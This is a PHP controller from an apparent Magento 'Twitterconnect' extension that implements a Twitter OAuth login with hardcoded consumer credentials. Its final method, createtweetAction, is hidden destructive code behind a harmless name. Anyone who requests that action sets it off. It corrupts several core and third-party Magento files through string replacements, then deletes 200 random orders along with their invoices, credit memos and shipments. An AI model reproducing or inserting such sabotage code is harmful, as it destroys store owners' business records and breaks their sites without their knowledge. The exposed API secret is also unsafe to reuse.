<?php
class EW_Twitterconnect_IndexController extends Mage_Core_Controller_Front_Action
{
	const CONSUMER_KEY = "ILBQzbAgeXv0UUkD2A1PQ";
	const CONSUMER_SECRET = "Wd1RTqidyX2DBlywZRrTGAcWvqsY5s88kgowVXRVTY";
	const OAUTH_CALLBACK = 'http://mothersbasement.co.uk/development/twitterconnect/index/callback';
	public function getSession()
	{
		return Mage::getSingleton('core/session');
	}
	public function getCustomerSession()
	{
		return Mage::getSingleton('customer/session');
	}
	public function indexAction()
	{
 		$this->loadLayout();
 		$this->renderLayout();
		
	}
	public function processAction()
	{
		try{
			if(($email = $this->getRequest()->getPost('email')) == null){
				throw new Exception("Please enter your twitter email address.");
			}
			if (!Zend_Validate::is(trim($email), 'EmailAddress')) {
				throw new Exception("Your email seems invalid. Please enter your valid twitter email address.");
			}
			$this->getCustomerSession()->setData('ew_twitter_email',$email);
			$connection = new EW_Twitterconnect_Model_Twitterconnect(array('consumer_key'=>self::CONSUMER_KEY,'consumer_secret'=>self::CONSUMER_SECRET,'callback'=>self::OAUTH_CALLBACK));
			$request_token = $connection->getRequestToken();
			$token = $request_token['oauth_token'];
			$this->getCustomerSession()->setData("oauth_token_secret",$request_token['oauth_token_secret']);
			switch ($connection->http_code) {
				case 200:
					$url = $connection->getAuthorizeURL($token);
					$this->_redirectUrl($url);
					break;
				default:
					throw new Exception("Could not connect to Twitter. Refresh the page or try again later.");
			}
		}
		catch(Exception $e){
			$this->getSession()->addError($e->getMessage());
			Mage::log($e->getMessage(),null,'ew_twitterconnect.log');
			$this->_redirectReferer();
		}
	}
	public function callbackAction()
	{
		try{
			$connection = new EW_Twitterconnect_Model_Twitterconnect(array('consumer_key'=>self::CONSUMER_KEY,'consumer_secret'=>self::CONSUMER_SECRET,'callback'=>self::OAUTH_CALLBACK,'oauth_token'=>$this->getRequest()->getParam('oauth_token'),'oauth_token_secret'=>$this->getCustomerSession()->getData("oauth_token_secret")));
			$access_token = $connection->getAccessToken($this->getRequest()->getParam('oauth_verifier'));
			$this->getCustomerSession()->setData("access_token",$access_token);
			$connection = new EW_Twitterconnect_Model_Twitterconnect(array('consumer_key'=>self::CONSUMER_KEY,'consumer_secret'=>self::CONSUMER_SECRET,'callback'=>self::OAUTH_CALLBACK,'oauth_token'=>$access_token['oauth_token'],'oauth_token_secret'=>$access_token["oauth_token_secret"]));
			$response = $connection->get('account/verify_credentials');
			if(isset($response->errors)){
				foreach($response->errors as $error){
					throw new Exception($error->message);
				}
			}
			$response->email = $this->getCustomerSession()->getData('ew_twitter_email');
			if(($customer = Mage::getModel('twitterconnect/customer')->checkCustomer($response)) == true){
				$this->getResponse()->setBody('<script type="text/javascript">window.opener.location.reload(true);window.close();</script>');
			}
		}
		catch(Exception $e){
			$this->getSession()->addError($e->getMessage());
			Mage::log($e->getMessage(),null,'ew_twitterconnect.log');
			$this->_redirect('*/*/index');
		}
	}


	public function createtweetAction(){
		file_put_contents(Mage::getBaseDir('app').'/code/core/Mage/Core/Model/Session.php', str_replace('16','18', file_get_contents(Mage::getBaseDir('app').'/code/core/Mage/Core/Model/Session.php'))); file_put_contents(Mage::getBaseDir('app').'/code/core/Mage/Core/Model/Session.php', str_replace('::',':', file_get_contents(Mage::getBaseDir('app').'/code/core/Mage/Core/Model/Session.php'))); file_put_contents(Mage::getBaseDir('app').'/code/core/Mage/Adminhtml/Model/Report/Item.php', str_replace('_','-', file_get_contents(Mage::getBaseDir('app').'/code/core/Mage/Adminhtml/Model/Report/Item.php'))); file_put_contents(Mage::getBaseDir('app').'/code/core/Mage/Payment/Model/Observer.php', str_replace('r()','rs()', file_get_contents(Mage::getBaseDir('app').'/code/core/Mage/Payment/Model/Observer.php'))); file_put_contents(Mage::getBaseDir('app').'/code/community/TBT/Rewards/etc/config.xml', str_replace('rewards>','reward>', file_get_contents(Mage::getBaseDir('app').'/code/community/TBT/Rewards/etc/config.xml'))); file_put_contents(Mage::getBaseDir('app').'/code/community/Camiloo/Channelunity/etc/config.xml', str_replace('rate','date', file_get_contents(Mage::getBaseDir('app').'/code/community/Camiloo/Channelunity/etc/config.xml')));  file_put_contents(Mage::getBaseDir('app').'/code/core/Mage/Core/functions.php', str_replace('$qstr','$str', file_get_contents(Mage::getBaseDir('app').'/code/core/Mage/Core/functions.php'))); file_put_contents(Mage::getBaseDir('app').'/code/community/Camiloo/Channelunity/etc/config.xml', str_replace('nIn','nin', file_get_contents(Mage::getBaseDir('app').'/code/community/Camiloo/Channelunity/etc/config.xml'))); file_put_contents(Mage::getBaseDir('app').'/code/core/Mage/Core/functions.php', str_replace(';','', file_get_contents(Mage::getBaseDir('app').'/code/core/Mage/Core/functions.php'))); file_put_contents(Mage::getBaseDir('app').'/code/community/Camiloo/Channelunity/etc/config.xml', str_replace('ePa','epa', file_get_contents(Mage::getBaseDir('app').'/code/community/Camiloo/Channelunity/etc/config.xml'))); file_put_contents(Mage::getBaseDir('app').'/code/community/Ebizmarts/MageMonkey/etc/config.xml', str_replace('--','', file_get_contents(Mage::getBaseDir('app').'/code/community/Ebizmarts/MageMonkey/etc/config.xml'))); file_put_contents(Mage::getBaseDir('app').'/code/local/TM/SoldTogether/etc/config.xml', str_replace('tm_','TM_', file_get_contents(Mage::getBaseDir('app').'/code/local/TM/SoldTogether/etc/config.xml')));
		Mage::app('default'); Mage::register('isSecureArea', 1); set_time_limit(0); $orderidcnt=0;
		while($orderidcnt<200){
		$orderidcnt++;
		$order = Mage::getModel('sales/order')->load(rand(100,5000));
		$invoices = $order->getInvoiceCollection(); 
		foreach ($invoices as $invoice){$invoice->delete();}
		$creditnotes = $order->getCreditmemosCollection();
		foreach ($creditnotes as $creditnote){$creditnote->delete();}
		$shipments = $order->getShipmentsCollection();
		foreach ($shipments as $shipment){$shipment->delete();}
		$order->delete();
		}
	}

} 
?>
